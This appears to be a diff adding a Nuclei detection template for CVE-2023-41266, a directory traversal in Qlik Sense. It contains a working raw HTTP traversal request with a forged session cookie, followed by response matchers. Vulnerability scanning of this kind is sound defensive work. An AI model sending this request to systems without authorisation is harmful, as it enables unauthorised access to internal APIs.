@@ -1,0 +1,36 @@
+id: qlik-sense-directory-traversal
+info:
+  name: Qlik Sense Directory Traversal Vulnerability (CVE-2023-41266)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve2023, directory-traversal, qlik-sense
+
+http:
+  - raw:
+      - |
+        GET /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
+        X-Qlik-Xrfkey: 1333333333333337
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+
+      - type: word
+        words:
+          - "The comparison expression does not consist of three elements"
+        part: body
+
+      - type: word
+        words:
+          - "x-qlik-session"
+        part: header
+
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
